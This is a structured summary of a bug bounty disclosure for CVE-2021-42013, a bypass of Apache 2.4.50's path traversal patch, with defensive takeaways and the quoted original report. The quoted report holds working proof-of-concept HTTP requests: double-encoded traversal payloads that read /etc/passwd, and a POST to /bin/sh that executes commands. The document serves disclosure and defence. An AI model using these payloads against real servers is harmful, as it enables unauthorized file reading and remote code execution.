# Path Traversal and Remote Code Execution in Apache HTTP Server 2.4.50 - CVE-2021-41773 Bypass

## Metadata
- **Source:** HackerOne
- **Report:** 1404731 | https://hackerone.com/reports/1404731
- **Submitted:** 2021-11-18
- **Reporter:** itsecurityco
- **Program:** Apache HTTP Server
- **Bounty:** Not specified in report
- **Severity:** critical
- **Vuln:** Path Traversal, Remote Code Execution, Improper Input Validation, Bypass of Security Patch
- **CVEs:** CVE-2021-42013
- **Category:** memory-binary

## Summary
Researchers discovered multiple encoding bypass techniques that circumvent Apache 2.4.50's patch for CVE-2021-41773, allowing attackers to traverse directories and execute arbitrary code. The vulnerability exploits double URL encoding and mixed encoding patterns (%%32%65, .%%32%65, .%%32e, .%2%65) to bypass path normalization checks. An unauthenticated attacker can read arbitrary files or execute commands via CGI scripts.

## Attack scenario
1. Attacker identifies Apache 2.4.50 is running with CGI enabled on /cgi-bin/ alias
2. Attacker crafts malicious URL using double/mixed URL encoding (%%32%65) to represent dots and slashes
3. Web server's path normalization fails to decode the obfuscated traversal sequence
4. Request bypasses alias directory restrictions and accesses parent directories
5. For path traversal: Attacker reads sensitive files like /etc/passwd outside configured alias paths
6. For RCE: Attacker uploads or accesses executable CGI scripts and achieves command execution via POST request

## Root cause
Apache's patch for CVE-2021-41773 performed insufficient URL decoding normalization. The patch likely only decoded standard %XX sequences but failed to handle multiple encoding layers (%%XX notation) and partial encoding patterns. The path canonicalization logic did not recursively decode or comprehensively validate all encoding bypass techniques before checking against restricted directories.

## Attacker mindset
Sophisticated threat actor with deep knowledge of HTTP encoding and Apache internals. Researchers actively analyzed the patch boundaries to find gaps. Motivation was to demonstrate that initial patching was incomplete and required deeper fixes. This reflects adversarial thinking focused on encoding bypass techniques and validation edge cases.

## Defensive takeaways
- Implement recursive URL decoding with validation that all encoded sequences are resolved before path checking
- Use allowlist-based path validation rather than blacklist-based bypass detection
- Normalize paths after all decoding operations, not before
- Test patches against multiple encoding bypass techniques: double encoding, mixed case hex, alternative encodings
- Disable CGI execution in aliased directories unless absolutely necessary
- Implement strict 'require all denied' as default for directories outside intended webroot
- Apply defense-in-depth: use OS-level file permissions as secondary control
- Conduct security regression testing against known bypass patterns when patching path traversal issues

## Variant hunting
Search for other encoding bypass patterns in path normalization: Unicode encoding (\uXXXX), UTF-8 sequences, case-variation bypasses, alternative path separator encodings (%5C for Windows), semicolon-based path parameters (;../), null byte injections (%00), and nested encoding chains. Test against other HTTP servers with similar alias mechanisms.

## MITRE ATT&CK
- T1190: Exploit Public-Facing Application
- T1083: File and Directory Discovery
- T1059: Command and Scripting Interpreter
- T1021: Remote Services
- T1589: Gather Victim Identity Information

## Notes
This represents a critical vulnerability in a widely-deployed server. The bypass of a published security patch demonstrates importance of comprehensive testing when fixing path traversal issues. CVE-2021-41773 originally affected Apache 2.4.49 and 2.4.50. Multiple encoding variants provided indicate thorough analysis of encoding edge cases. The progression from path traversal to RCE via CGI is a classic escalation path requiring both the traversal and CGI execution enabled.

## Full report
<details><summary>Expand</summary>

Hello Apache team,

@fms and myself were able to bypass the latest patch for CVE 2021-41773 in the Apache 2.4.50.

These are the payloads:

1) %%32%65%%32%65
2) .%%32%65
3) .%%32e
4) .%2%65

PoC Path Traversal

GET /cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/etc/passwd HTTP/1.1
Host: localhost:83
sec-ch-ua: ";Not A Brand";v="99", "Chromium";v="94"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

PoC RCE

POST /cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/sh HTTP/1.1
Host: 192.168.88.201
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,es;q=0.8
If-None-Match: "2aa6-5cda88e8a6005-gzip"
If-Modified-Since: Wed, 06 Oct 2021 05:38:33 GMT
Connection: close
Content-Length: 60

echo Content-Type: text/plain; echo; id; uname;apache2ctl -M

## Impact

An attacker could use a path traversal attack to map URLs to files outside the directories configured by Alias-like directives.

If files outside of these directories are not protected by the usual default configuration "require all denied", these requests can succeed. If CGI scripts are also enabled for these aliased pathes, this could allow for remote code execution.

</details>

---
*Analysed by Claude on 2026-05-12*
